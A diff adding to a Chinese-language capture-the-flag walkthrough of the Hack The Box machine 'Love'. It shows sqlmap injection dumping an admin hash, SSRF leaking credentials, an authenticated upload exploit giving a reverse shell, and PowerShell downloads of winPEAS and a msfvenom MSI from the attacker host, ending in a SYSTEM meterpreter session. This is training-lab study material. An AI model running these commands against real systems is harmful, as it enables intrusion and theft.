@@ -68,7 +68,6 @@ PORT     STATE    SERVICE      VERSION
 |_  http/1.1
 |_http-title: 403 Forbidden
 445/tcp  open     microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
-1099/tcp filtered rmiregistry
 3306/tcp open     mysql?
 | fingerprint-strings: 
 |   FourOhFourRequest, NULL, NotesRPC: 
@@ -122,7 +121,7 @@ Nmap done: 1 IP address (1 host up) scanned in 147.82 seconds
 ```
 
 
-# web
+## web
 ```
 ┌──(root💀kali)-[~/dirsearch]
 └─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.239                                 
@@ -192,7 +191,11 @@ Shellcodes: No Results
 
 ```
 
+有个未授权的RCE，试过不行。
+还有个授权的RCE，但是我没没有登录凭据。
+还有个sql注入，假如存在sql注入，那么我们就可以拿到用户凭据，尝试授权的RCE
 
+尝试sql注入
 ```
 ┌──(root💀kali)-[~/htb/Love]
 └─# sqlmap -r data --batch -p voter --level 5 --risk 3 
@@ -229,3 +232,191 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 ```
 
 证实用户名voter字段存在基于时间的sql注入
+
+以下payload拿到所有数据库名字
+```
+sqlmap -r data --batch -p voter --level 3 --risk 3 --dbms=mysql --technique=T --dbs
+```
+
+返回
+```
+available databases [6]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin
+[*] test
+[*] votesystem
+
+```
+
+
+同样的方法，一步步测试，用下面payload拿到用户凭据
+```
+sqlmap -r data --batch -p voter --level 3 --risk 3 --dbms=mysql --technique=T -D votesystem -T admin -C username,password --dump
+
+Database: votesystem
+Table: admin
+[1 entry]
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$10$psrWULJqgpPOl4HUt.ctM.vFMYJjh65EiRFDbIAZsa3z/F3t/8zXW |
++----------+--------------------------------------------------------------+
+
+```
+
+但是用john和hashcat我都无法爆破这个密码
+
+## vhost爆破
+把love.htb写进hosts文件
+```echo "10.10.10.239  love.htb" >> /etc.hosts```
+
+使用gobuster爆破子域名
+```
+┌──(root💀kali)-[~/htb/Love]
+└─# gobuster vhost -u love.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:          http://love.htb
+[+] Method:       GET
+[+] Threads:      100
+[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+[+] User Agent:   gobuster/3.1.0
+[+] Timeout:      10s
+===============================================================
+2022/01/24 00:57:35 Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: staging.love.htb (Status: 200) [Size: 5357]
+
+```
+
+得到一个```staging.love.htb```的子域名
+
+把这个域名添加到hosts文件，打开80端口是一个叫```free file scanner```的web app
+
+## SSRF
+
+在Demo模块，要求输入一个url地址，尝试本地写一个php文件，用python开启一个简易的web server，再访问这个php文件，显示是可以访问，但是php没有被执行
+
+尝试内网访问80端口：```http://127.0.0.1```
+返回登录页面
+
+尝试内网访问443端口：```http://127.0.0.1:443```
+返回
+```
+Bad Request
+
+Your browser sent a request that this server could not understand.
+Reason: You're speaking plain HTTP to an SSL-enabled server port.
+Instead use the HTTPS scheme to access this URL, please.
+```
+
+尝试内网访问5000端口
+
+```http://127.0.0.1:5000```爆出了admin的密码信息
+
+> Vote Admin Creds admin: @LoveIsInTheAir!!!! 
+
+## foodhold
+现在我们有了登录信息，可以利用授权的RCE拿shell
+```
+Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)           | php/webapps/49445.py
+```
+
+源代码需要编辑相关信息，以及修改路径
+```
+# --- Edit your settings here ----
+IP = "10.10.10.239" # Website's URL
+USERNAME = "admin" #Auth username
+PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
+REV_IP = "10.10.14.3" # Reverse shell IP
+REV_PORT = "4242" # Reverse port
+# --------------------------------
+
+INDEX_PAGE = f"http://{IP}/admin/index.php"
+LOGIN_URL = f"http://{IP}/admin/login.php"
+VOTE_URL = f"http://{IP}/admin/voters_add.php"
+CALL_SHELL = f"http://{IP}/images/shell.php"
+
+```
+
+
+执行以后收到反弹shell
+```
+┌──(root💀kali)-[~/htb/Love]
+└─# nc -lvnp 4242                                                                                               1 ⨯
+listening on [any] 4242 ...
+connect to [10.10.14.3] from (UNKNOWN) [10.10.10.239] 53219
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images>whoami
+whoami
+love\phoebe
+
+```
+
+# 提权
+
+传winpeas到靶机
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/winPEASx64.exe','c:\Users\Phoebe\Downloads\winPEASx64.exe')"
+```
+
+
+## 注册表提权
+
+执行winpeas以后发现HKLM和HKCU的值都是1
+
+```
+����������͹ Checking AlwaysInstallElevated
+�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+```
+意味着我们可以使用注册表提权（Registry Escalation）
+
+编译一个反弹shell的msi文件
+```
+┌──(root💀kali)-[~/htb/Love]
+└─# msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.14.3 lport=4444 -f msi -o setup.msi
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of msi file: 159744 bytes
+Saved as: setup.msi
+```
+
+传到靶机
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.3/setup.msi','c:\Users\Phoebe\Downloads\setup.msi')"
+```
+
+执行msi文件
+```
+c:\Users\Phoebe\Downloads>.\setup.msi
+.\setup.msi
+
+```
+
+收到反弹shell
+```
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.3:4444 
+[*] Sending stage (175174 bytes) to 10.10.10.239
+[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.239:53222 ) at 2022-01-24 02:33:20 -0500
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
+已经是SYSTEM权限。
